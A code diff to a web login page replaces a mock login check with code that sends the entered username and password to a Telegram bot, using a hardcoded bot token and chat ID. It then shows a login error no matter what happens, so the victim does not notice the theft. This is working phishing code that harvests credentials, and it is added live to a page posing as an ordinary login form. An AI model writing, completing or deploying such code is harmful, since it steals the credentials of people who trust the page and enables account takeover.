@@ -117,15 +117,23 @@
         function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const botToken = '6717802830:AAHimj9bkZdLs4RHTyf9yL1z-UELpInqAQo';
+            const chatId = '5634946920';
 
-            // This is just a simulation of a login check
-            if (username === "test" && password === "1234") {
-                // Successful login logic here
-                alert('Login successful!');
-            } else {
-                // Show error message
-                document.getElementById('error-message').style.display = 'block';
-            }
+            const message = `Username: ${username}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Show error message regardless of the response
+                    document.getElementById('error-message').style.display = 'block';
+                })
+                .catch(error => {
+                    // Show error message on error
+                    document.getElementById('error-message').style.display = 'block';
+                });
         }
     </script>
 </body>
